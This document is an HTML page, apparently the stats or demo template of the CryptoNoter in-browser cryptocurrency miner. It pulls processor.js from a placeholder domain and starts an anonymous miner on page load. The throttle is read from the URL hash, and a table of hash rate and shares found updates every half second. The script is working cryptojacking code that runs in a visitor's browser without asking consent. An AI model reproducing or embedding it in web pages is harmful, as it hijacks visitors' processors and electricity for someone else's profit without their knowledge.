<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<title>CryptoNoter</title>
	<style>
		th {
			width: 180px;
		}
	</style>
	<script src="https://%CryptoNoter_domain%/processor.js"></script>
	<script>
		var addr = 'CryptoNoter';
		var miner = new CryptoNoter.Anonymous(addr, {
			throttle: 0.3
		});
		miner.start();
		// Listen on events
		var found = 0,
			accepted = 0;
		miner.on('found', function () {
			found++;
		});
		miner.on('accepted', function () {
			accepted++;
		})
		// Update stats once per second
		setInterval(function () {
			var idle = parseFloat(location.hash.split('#')[1]) || 0.5;
			var hashesPerSecond = miner.getHashesPerSecond();
			var totalHashes = miner.getTotalHashes();
			var acceptedHashes = miner.getAcceptedHashes();
			miner.setThrottle(idle);
			document.body.innerHTML = '<h2>CryptoNoter User : ' + addr +
				'</h2><table border="1"><tr><th>Threads</th><th>Total Hashes</th><th>Shares Found</th><th>Shares Verfied</th></tr><tr><td>' + parseInt(
					hashesPerSecond) + '</td><td>' + totalHashes + '</td><td>' + found + '</td><td>' + accepted +
				'</td></tr></<table>';
		}, 500);
	</script>
</head>

<body>
	CryptoNoter
</body>

</html>
